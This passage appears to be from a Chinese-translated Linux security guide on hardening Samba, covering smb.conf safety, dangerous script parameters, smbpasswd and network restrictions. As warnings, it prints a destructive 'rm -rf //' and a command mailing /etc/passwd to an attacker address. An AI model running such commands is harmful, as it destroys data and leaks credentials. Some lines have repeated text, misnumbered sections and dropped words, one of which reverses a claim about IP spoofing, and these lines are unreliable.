
如果你使用的是基于 RPM 的发行版（如 Red Hat、SuSE 或 Mandrake），你可以运行命令：

```
rpm -qa | grep samba
```

来查找你是否安装了它。返回的 RPM 名称可能会提示你该机器上安装的版本。

## 4.8.4 我安装的是哪个版本的 Samba？

一旦你确定机器上安装了 Samba，确定版本就简单了。只需输入 `smbd -V` 即可。系统将返回类似以下的内容：

Version 2.2.4

或

Version 3.0.0-alpha17

如果你使用的是 2.0.10 之前的 Samba 版本，或者你使用的是 2.2.0a，你应该升级到较新的版本。此前，存在一个宏展开漏洞，可以被远程利用并对你的文件系统造成破坏。Samba 的最新版本是 2.2.4。Samba 正在持续开发，像 HP、IBM 和 Quantum 等许多大公司都投入了大量资源使 Samba 变得更好

## 4.8.5 smb.conf 文件

`smb.conf` 文件是告诉 Samba 如何工作的主文件。它包含了用于指示整个系统的分段，以及用于配置 Linux 机器上不同路径如何提供给 Windows 电脑的段。它的格式模仿 Windows 的 `.INI` 文件。

在 `smb.conf` 文件中，有几点是你需要注意的，这对系统安全至关重要。首先，`smb.conf` 文件需要放在安全的地方，除了 root 用户之外的任何人都不能对其进行修改。确保文件所有者为 root，组为 root，且文件权限不大于 644。

其次，密切关注文件的内容。Samba 程序员添加了一些参数，如果使用不当，可能会让你的系统面临受攻击的风险。这里列出了危险的参数供你参考，但并不是一个详尽列表，因为 Samba 是一个不断变化和演变的程序。这里列出的某些参数来自即将到来的 3.0 版本，所以如果你的版本没有它们，不必担心。

```
abort shutdown script
add printer command
add share command
add user script
add machine script
delete printer command
delete share command
delete user script
dfree command
message command
lppause command
lpq command
lpresume command
lprrm command
passwd chat
passwd program
print command
queuega command
queueresume command
exec,preexec,preexec,postexec, root postexec
magic script (very dangerous)
shutdown script
wins hook
```

上述所有参数名称均指 Samba 服务器代表用户调用的外部程序或脚本。大多数以 root 用户身份执行，如果你作为系统管理员不小心，它们可能包含恶意内容，例如：

```
rm -rf //
```

或

```
mail cracker@badguys.net < /etc/passwd
```

要特别小心它们调用的命令。想象一下一个“植入木马”的密码程序可能造成的破坏。由于 Samba 被人们充分理解，通过操作 `smb.conf` 文件来修改其行为是非常的。

```
config file
include
```

这些参数通常（但并非总是）出现在全局段中，允许其他备用配置文件替换 `smb.conf` 文件，或者通过 `include` 指令成为其的一部分。如果存在这些参数，请像关注主 `smb.conf` 文件一样密切关注它们的内容。大多数安装都不需要使用这两个指令之一。

- `follow symlinks`（跟随符号链接）

- `wide links`（宽链接）

这些指令可以限制 Samba 仅查看本地文件系统而不跟随符号链接。通常情况下你不会使用这些，因为它们会产生性能影响，但它们可以防止用户通过将 `/etc/passwd` 链接到其家目录并将其拷贝出机器而进行的符号链接攻击。

## 4.8.6 smbpasswd 文件

如果你希望在 Windows 电脑上使用加密密码，则需要 `smbpasswd` 文件，自 Windows 95 OSR-2 和 Windows NT 补丁 3 起这是默认设置。你需要在 `smb.conf` 文件中包含指令

```
encrypt passwords = yes
```

`smbpasswd` 文件由 6 个不同的冒号分隔字段组成：

- 1. 用户名。未加密的 Windows 用户名。大小不敏感。

- 2. UNIX 用户 ID。用于控制文件系统权限的 UID。如果 Billy 登录 Windows ，这是他在 Linux 机器上的 UID。

- 3. LAN 密码。使用用户的密码作为盐值来推导出此值。

- 4. NT 密码。密码被转换为 Unicode 并使用 MD4 加密。

- 5. 账户标志。它告诉你账户的类型。

- 6. 密码上次更改的时间。

Samba 的最新版本是 2.2.4。Samba 正在持续开发，像 HP、IBM 和 Quantum 等许多大公司都投入了大量资源使 Samba 变得更好

### 4.8.7 用户映射

映射功能允许将 Windows 用户名映射到 UNIX 用户。当你有多个 Windows 用户应该访问同一个 Linux 用户时，这特别有用。

### 4.8.8 日志

Samba 可以记录到各种位置，你可以在 `smb.conf` 文件中配置这种行为。最常见的方法记录到文件中。

```
log file = /var/log/samba.log
max log size = 5000
debug level = 0
```

## 4.8 使用 Samba

大多数这些进程只有 root 权限。它们被用于跟踪文件锁、连接、打印机和打印机驱动程序以及其他一些东西。如果破解者获取了 root 权限，他就可以删除并破坏你的数据。

## 4.8.10 安全地设置 Samba

Samba 是一个共享文件和打印机的绝佳工具。然而，如果你不小心，可能会损害你的系统安全。以下章节旨在帮助你安全地设置 Samba 服务器，并定义你可能需要采取的常规预防措施。其中某些章节仅适用于较新版本的 Samba；这将在文中注明。

## 4.8.11 Samba 网络安全

进入 Samba 服务器的入口是网络接口。Samba 以以两个守护进程的形式运行：`smbd` 为客户端提供服务，而 `nmbd` 提供名称解析服务。这些守护进程运行在端口 137、138 和 139 上。仅限 IP 的服务（不包含 NetBIOS）运行在端口 445 上，如果你选择使用它们，也需要在那里采取适当的预防措施。**务必在你的防火墙上拦截这些端口。**

### 4.8.11.1 监听正确的接口

Samba 通常绑定到机器上的所有接口，在只有单块网卡的计算机上，这种行为正是你所需要的。然而，你可以通过设置几个参数来限制 Samba 监听网络上的每一个垃圾流量。如果你有多个网卡（例如，在公司内部的防火墙/路由器中），你可以使用 `smb.conf` 文件全局部分中的以下选项，来限制 Samba 允许从特定接口或网络的流量。

```
[global]
  #仅监听指定的接口
  bind interfaces only = yes
  # 允许来自哪些接口的流量
  # Samba 也理解 linux 惯例 (eth0)
  interfaces 127.0.0.1 192.168.1.1
  # 监听哪些网络
  # 排除路由器地址
  hosts allow = 127.0.0.1 192.168.1.1 EXCEPT 192.168.1.1
  # 忽略哪些网络
  hosts deny = 0.0.0.0
```

这些参数将帮助让诚实的人保持诚实；然而，它们并防止 IP 欺骗。它们为不诚实的人的穿越提供了另一个障碍。

### 4.8.11.2 阻止意外流量

上述章节中显示的指令是开始将破解排除排除系统之外的一种非常好的方法。你可以更进一步，添加 IP 链或 IP 表来进一步限制访问，而且如果需要，当网络外部的人尝试访问你的 Samba 服务器时，你可以收到通知。

#### 4.8.11.2 IP 链

你可以通过系统上的 IP 表或 IP 链来进一步保护 Samba。在大多数网络中，Samba 服务器位于防火墙后的子网中，通常使用 NAT。以下规则将帮助你保护 Samba 服务器免受意外网络流量的影响，作为额外的安全防线来威慑潜在的捣乱者。

以下 IP 链将阻止来自你本地网络以外的任何 Samba 相关的流量，假设你的服务器位于 `192.168.1.0/24` 网络上：

```
# 允许来自我们“朋友”的 SMB 输入
ipchains -A input -p tcp -s 192.168.1.0/24 --dport 137:139 -j ACCEPT
ipchains -A input -p udp -s 192.168.1.0/24 --dport 137:139 -j ACCEPT
```
